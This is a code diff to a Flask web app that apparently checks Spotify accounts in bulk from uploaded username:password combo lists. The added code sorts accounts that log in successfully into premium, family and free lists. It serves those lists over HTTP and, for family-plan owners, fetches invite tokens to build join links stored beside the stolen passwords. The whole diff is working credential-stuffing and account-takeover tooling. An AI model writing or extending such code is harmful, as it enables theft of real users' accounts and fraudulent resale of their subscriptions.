@@ -4,6 +4,7 @@ import requests
 from lxml import html
 from bs4 import BeautifulSoup
 import traceback
+import math
 app = Flask(__name__)
 @app.route("/")
 @app.route("/main")
@@ -14,8 +15,29 @@ def main():
 def error():
     return "Something unexpected has occurred."
 
+@app.route("/free")
+def free():
+    with open("free.txt", "r") as free:
+        accs = free.readlines()
+    return render_template("list.html", accs=accs)
+
+@app.route("/premium")
+def premium():
+    with open("premium.txt", "r") as premium:
+        accs = premium.readlines()
+    return render_template("list.html", accs=accs)
+
+@app.route("/family")
+def family():
+    with open("family.txt", "r") as family:
+        accs = family.readlines()
+    return render_template("list.html", accs=accs)
+
 @app.route("/file_received", methods=["POST"])
 def file_received():
+    open("premium.txt","w").close()
+    open("family.txt","w").close()
+    open("free.txt","w").close()
     if request.method == "POST":
         accounts_file = request.form.get("account-list")
         try:
@@ -24,8 +46,14 @@ def file_received():
                 accounts = content.readlines()
             for idx,line in enumerate(accounts):
                 div = line.split(":")
-                account.append([div[0], div[1], "not_checked"])
+                try:
+                    account.append([div[0], div[1].split("|")[0].replace(" ",""), "not_checked"])
+                except:
+                    account.append([div[0], div[1], "not_checked"])
             for cnt, user in enumerate(account):
+                max_accs = len(account)
+                if(cnt%10 == 0):
+                    print(str(cnt) + "/" + str(max_accs))
                 pl = {
                 "remember": "false",
                 "username": user[0].replace("\n", ""),
@@ -59,7 +87,34 @@ def file_received():
                         elif("overview-premium" in plan):
                             user[2] = "(PREMIUM-PLAN)"
                             with open ("premium.txt", "a") as premium:
-                                premium.write(user[0] + ":" + user[1] + "|" + "Pais" + "|" + "Fecha")
+                                premium.write(user[0] + ":" + user[1])
+                        elif("overview-new-family" in plan):
+                            user[2] = "(FAMILY-PLAN)"
+                            try:
+                                while True:
+                                    new_date = api_request.get('https://www.spotify.com/es/home-hub/api/v1/family/home/')
+                                    if new_date.status_code == 200:
+                                        break
+                                res = new_date.json()
+                                link = ("https://www.spotify.com/es/family/join/invite/" + res["inviteToken"])
+                                user[2] = ("(FAMILY-OWNER) " + link)
+                                with open ("family.txt", "a") as family:
+                                    family.write(user[0] + ":" + user[1] + "|" + link + "\n")
+                            except:
+                                with open ("family.txt", "a") as family:
+                                    family.write(user[0] + ":" + user[1])
+                        elif("overview-cancel-recurring" in plan):
+                            
+                            while True:
+                                new_date = api_request.get('https://www.spotify.com/es/home-hub/api/v1/family/home/')
+                                if new_date.status_code == 200:
+                                    break
+                            res = new_date.json()
+                            link = ("https://www.spotify.com/es/family/join/invite/" + res["inviteToken"])
+                            user[2] = ("(FAMILY-OWNER) " + link)
+                            with open ("family.txt", "a") as family:
+                                family.write(user[0].replace("\n", "") + ":" + user[1].replace("\n", "") + "|" + link + "\n")
+                        
                         else:
                             user[2] = "False"   
                     except:
@@ -71,4 +126,4 @@ def file_received():
             traceback.print_exc()
             return redirect(url_for("error", account=account))
 if __name__ == "__main__":
-    app.run(port="1337", debug=True)
+    app.run(port="1337")
